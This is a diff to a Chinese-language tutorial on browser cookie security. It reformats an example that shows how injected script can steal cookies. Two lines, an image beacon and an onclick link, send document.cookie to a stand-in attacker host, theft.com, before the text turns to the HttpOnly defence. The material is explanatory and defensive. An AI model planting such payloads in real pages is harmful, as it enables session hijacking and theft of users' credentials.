@@ -51,7 +51,9 @@ document.cookie='cookieName=cookieValue; expires=Tue, 06 Apr 2021 11:46:35 GMT; 
 在客户端执行了没有经过过滤的恶意代码将cookie发送到第三方服务器上，即使cookie添加了secure，如果第三方服务器启用了https，一样会被发送,如下代码
 ```js
  (new image()).src='https://theft.com/transparent.jpg?cookie='+document.cookie;
- <a href="#" onclick="window.location = 'http://theft.com/stole?cookie=' + encodeURIComponent(document.cookie); return false;">点击</a>
+```
+```html
+<a href="#" onclick="window.location = 'http://theft.com/stole?cookie=' + encodeURIComponent(document.cookie); return false;">点击</a>
 ```
 
 1.由服务端通过Set-Cookie设置httponly
